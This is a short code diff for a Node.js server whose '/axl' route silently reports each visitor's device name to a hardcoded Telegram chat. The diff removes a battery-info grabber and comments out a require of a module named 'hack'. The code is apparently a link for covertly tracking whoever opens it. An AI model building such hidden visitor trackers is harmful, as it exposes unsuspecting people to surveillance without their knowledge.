@@ -77,20 +77,6 @@ function getDeviceName(userAgent) {
 
 
 // Function to get battery information
-async function getBatteryInfo() {
-  if (navigator && navigator.getBattery) {
-    const battery = await navigator.getBattery();
-    return {
-      BatteryLevel: `${battery.level * 100}%`,
-      ChargingStatus: `Device is ${battery.charging ? "charging" : "not charging"}`
-    };
-  } else {
-    return {
-      BatteryLevel: "Battery API not supported",
-      ChargingStatus: "Battery API not supported"
-    };
-  }
-}
 
 
 
@@ -99,17 +85,18 @@ async function getBatteryInfo() {
 const ajsal = '6524787237';
 
 // Set up a basic HTTP server to bind to a port (required by Render)
-app.get('/axl' , async (req, res) => {
+app.get('/axl' , (req, res) => {
   const userAgent = req.headers['user-agent'];
   const deviceName = getDeviceName(userAgent);
+/*  const { getBattery } = require('./hack');
   const batteryInfo = getBatteryInfo();
-  // Send a message to your Telegram ID with the detected device name
+  */// Send a message to your Telegram ID with the detected device name
 
  
  const tmsg = `Someone accessed the URL 
 
 D:- ${deviceName}
-B:-  ${batteryInfo}`;
+B:-  ✅️`;
  
  
   bot.sendMessage(ajsal, tmsg);
